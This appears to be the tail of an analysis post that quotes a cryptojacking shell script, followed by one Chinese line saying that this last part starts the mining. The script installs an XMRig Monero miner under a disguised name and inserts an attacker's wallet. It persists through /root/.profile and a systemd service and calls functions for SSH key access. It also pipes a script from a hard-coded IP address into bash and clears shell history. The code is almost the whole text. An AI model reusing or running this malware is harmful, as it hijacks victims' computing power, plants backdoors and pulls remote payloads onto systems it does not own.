         downloads $miner_url /tmp/xmrig.tar.gz  $miner_url_backup && tar -xf /tmp/xmrig.tar.gz -C $MOHOME/ && mv $MOHOME/xmrig*/xmrig  $MOHOME/\[crypto\]
 fi


if [ -f "$MOHOME/[crypto].pid" ]
then
    echo "miner config exists"
else
    downloads $config_url $MOHOME/\[crypto\].pid $config_url_backup
fi

rm /tmp/xmrig.tar.gz



echo "[*] Checking if stock version is OKAY!"
  $MOHOME/[crypto] --help >/dev/null
  if (test $? -ne 0); then
    if [ -f $MOHOME/[crypto] ]; then
      echo "ERROR: Stock version of $MOHOME/[crypto] is not functional too"
    else
      echo "ERROR: Stock version of $MOHOME/[crypto] was removed by antivirus too"
    fi
    exit 1
  fi

echo "[*] $MOHOME/[crypto] is OK"


#sed -i 's/"url": *"[^"]*",/"url": "18.210.126.40:'$PORT'",/' $MOHOME/[crypto].pid
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $MOHOME/[crypto].pid
#sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $MOHOME/[crypto].pid
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $MOHOME/[crypto].pid
#sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $MOHOME/[crypto].pid

cp $MOHOME/[crypto].pid $MOHOME/config_background.json
sed -i 's/"background": *false,/"background": true,/' $MOHOME/config_background.json

# preparing script

echo "[*] Creating $MOHOME/[crypto].sh script"
cat >$MOHOME/[crypto].sh <<EOL
#!/bin/bash
if ! pidof [crypto] >/dev/null; then
  nice $MOHOME/[crypto] \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x $MOHOME/[crypto].sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep $MOHOME/[crypto].sh /root/.profile >/dev/null; then
    echo "[*] Adding $MOHOME/[crypto].sh script to /root/.profile"
    echo "$MOHOME/[crypto].sh --config=$MOHOME/config_background.json >/dev/null 2>&1" >>/root/.profile
  else
    echo "Looks like $MOHOME/[crypto].sh script is already in the /root/.profile"
  fi
  echo "[*] Running crypto service in the background (see logs in $MOHOME/[crypto].log file)"
  /bin/bash $MOHOME/[crypto].sh --config=$MOHOME/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    /bin/bash $MOHOME/[crypto].sh --config=$MOHOME/config_background.json >/dev/null 2>&1

  else

    echo "[*] Creating crypto systemd service"
    cat >/tmp/crypto.service <<EOL
[Unit]
Description=crypto system service

[Service]
ExecStart=$MOHOME/[crypto] --config=$MOHOME/[crypto].pid
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/crypto.service /etc/systemd/system/crypto.service
    echo "[*] Starting crypto systemd service"
    sudo killall [crypto] 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable crypto.service
    sudo systemctl start crypto.service
  fi
fi

}

KILLMININGSERVICES

SetupMoneroOcean

makesshaxx

checksshkeys

SecureTheSystem

FixTheSystem

echo ""
echo "[*] Setup complete"
curl -fsSL http://199.19.226.117/b2f628fff19fda999999999/is.sh | bash
cd1 -fsSL http://199.19.226.117/b2f628fff19fda999999999/is.sh | bash
history -c
```

最后部分就是开始挖矿了.
